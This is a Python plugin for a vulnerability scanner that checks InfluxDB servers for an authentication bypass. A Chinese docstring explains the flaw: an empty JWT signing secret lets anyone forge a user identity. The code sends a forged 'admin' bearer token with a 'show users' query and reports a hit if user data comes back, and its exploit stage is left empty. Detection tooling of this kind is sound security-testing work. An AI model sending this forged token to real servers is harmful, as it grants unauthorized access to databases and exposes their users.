#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
influxdb是一款著名的时序数据库
    influxdb 未授权访问
        暂无编号
            Payload: https://vulhub.org/#/environments/influxdb/unacc/

其使用jwt作为鉴权方式
    在用户开启了认证, 但未设置参数shared-secret的情况下, jwt的认证密钥为空字符串,
    此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句
'''

from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {
                'path': 'query',
                'data': 'db=sample&q=show+users',
                'headers': {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo2NjY2NjY2NjY2fQ.XVfnw6S7uq4i9_RraPztULowgOlKLkX60MYcXWZbot0'}
            },
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': 'influxdb',
            'vul_type': 'unAuth',
            'vul_id': 'influxdb-unAuthorized',
        }

        for payload in self.payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']

            res = client.request(
                'post',
                path,
                data=data,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (('results' in res.text)
                and ('statement_id' in res.text)
                and ('series' in res.text)
                and ('columns' in res.text)
                and ('user' in res.text)
                and ('admin' in res.text)
                and ('values' in res.text)
            ):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
